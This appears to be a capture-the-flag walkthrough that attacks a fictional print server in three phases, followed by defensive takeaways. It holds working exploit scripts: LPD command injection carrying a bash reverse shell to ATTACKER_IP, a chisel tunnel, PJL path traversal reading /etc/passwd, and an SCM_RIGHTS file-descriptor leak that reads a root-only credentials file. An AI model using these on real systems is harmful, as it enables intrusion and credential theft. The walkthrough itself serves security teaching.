Phase 1

Initial Access — LPD Command Injection

Vulnerability Analysis

In server.py, the handle_print_job() method processes incoming LPD print jobs. The J field from the control file (the "job name") is interpolated directly into a shell command with no sanitization:

# server.py — vulnerable line
subprocess.Popen(
    f"echo 'Archive: {job_name}' >> /tmp/archive.log",
    shell=True
)
Why this is exploitable shell=True passes the entire string to /bin/sh -c, which interprets shell metacharacters. By injecting '; command # into job_name, we close the echo's single quote, terminate it with ;, execute our command, and comment out the rest with #.

Exploit

The LPD protocol (RFC 1179) uses a simple binary format. A print job submission starts with command byte 0x02 followed by the queue name. After the server acknowledges, we send a control file containing the malicious J field.

exploit.py
import socket

s = socket.socket()
s.connect(("TARGET_IP", 1515))

# Send print job request for "archive_intake" queue
s.send(b'\x02archive_intake\n')
r = s.recv(1)                       # \x00 = accepted
print(f"Queue: {r}")

if r == b'\x00':
    # Inject reverse shell into the J (job name) field
    cmd = "'; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1' #"
    control = f"Hattacker\nJ{cmd}\n"
    header = f"\x02{len(control)} cfA001attacker\n".encode()
    s.send(header)
    s.recv(1)
    s.send(control.encode() + b'\x00')
    s.recv(1)
s.close()

# Terminal 2 — fire exploit

Phase 2

Lateral Movement — lp → archivist (PJL Path Traversal)

Port 9100 is only accessible from localhost, so we use chisel to tunnel it to the attacker machine:

# Attacker
$ ./chisel server -p 9999 --reverse

# Target (as lp)
$ ./chisel client ATTACKER_IP:9999 R:9100:127.0.0.1:9100

PJL Protocol Exploration

PJL (Printer Job Language) is a protocol used by HP printers. The JetDirect service implements several PJL filesystem commands. The key vulnerability is in the Filesystem._translate() method:

def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
Why this is exploitable The method strips 0: prefixes and converts backslashes, but never rejects .. traversal sequences. os.path.normpath() resolves .. but doesn't enforce that the result stays within the root directory. A path like 0:/../../../etc/passwd escapes the printer's root and reads arbitrary files as archivist.

Confirm Path Traversal with FSUPLOAD

read_file.py
import socket, time

path = '0:/../../../etc/passwd'
payload = (
    f'\x1b%-12345X@PJL FSUPLOAD NAME="{path}" '
    f'OFFSET=0 SIZE=4096\r\n\x1b%-12345X'
)

s = socket.socket()
s.connect(('127.0.0.1', 9100))
s.send(payload.encode())
time.sleep(2)
s.settimeout(3)
try:
    r = s.recv(4096)
    print(r.decode(errors='ignore'))
except:
    print("timeout")
s.close()

Phase 3

Privilege Escalation — archivist → root (SCM_RIGHTS fd Leak)

Understanding paperwork-daemon

A custom daemon at /usr/bin/paperwork-daemon runs as root and listens on a Unix socket at /run/paperwork/mgmt.sock (accessible to archivist, uid 1000).

$ cat /etc/systemd/system/paperwork.service
[Service]
ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
User=root
Group=root

At startup, the daemon opens /etc/paperwork/admin_pins.conf (readable only by root) and keeps the file descriptor alive for the entire process lifetime:

# paperwork-daemon — startup
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)

The Trigger Mechanism

On each client connection, the daemon reads commands.log and checks for suspicious PJL commands:

def scan_for_malice():
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in
               ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

If triggered, it sends both file descriptors (the log and the admin config) to the client via SCM_RIGHTS ancillary data:

def trigger_lockdown(conn):
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg(
        [msg],
        [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
    )
Key Concept — SCM_RIGHTS SCM_RIGHTS is a Unix mechanism for passing open file descriptors between processes over a Unix domain socket. The critical detail: once a file descriptor is transferred, the receiving process inherits the access rights of the opener — not its own. Since root opened admin_pins.conf, the fd we receive lets us read the file even though archivist has no filesystem permission to do so. The access bypasses on-disk file permissions entirely.

Exploit

Step 1: Poison the log file with a trigger word. As archivist, we have write access to commands.log:

$ echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log

Step 2: Connect to the socket and receive the leaked fd:

leak_fd.py
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')

# Receive message + ancillary data containing file descriptors
msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8))
print("Message:", msg)

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if (cmsg_level == socket.SOL_SOCKET and
        cmsg_type == socket.SCM_RIGHTS):
        fds = array.array("i")
        fds.frombytes(cmsg_data)
        for fd in fds:
            data = os.pread(fd, 1024, 0)
            print(f"FD {fd}: {data.decode()}")

s.close()

Appendix

Key Takeaways

Never use shell=True with untrusted input.

The LPD server's use of subprocess.Popen(f"...{job_name}...", shell=True) directly enabled RCE. Use subprocess.run(["echo", job_name]) with a list of arguments instead — the shell never interprets metacharacters that way.

Path normalization is not path validation.

os.path.normpath() resolves .. components but does not check whether the result stays inside a designated root. Always verify the resolved path starts with your root directory: assert resolved.startswith(root).

SCM_RIGHTS transfers access, not just a reference.

Once a file descriptor is passed over a Unix socket, the receiver can read/write it using the original opener's permissions. A root process that holds sensitive fds should never pass them to unprivileged clients. This is a design flaw — the daemon was intended to share forensic evidence, but it leaked the admin credential fd along with it.

Internal services need the same security posture as external ones.

The JetDirect service was bound to 127.0.0.1 and wasn't directly exposed, but once an attacker gets any foothold (even a low-privilege lp shell), internal services become directly reachable. "Internal only" is not a security boundary.
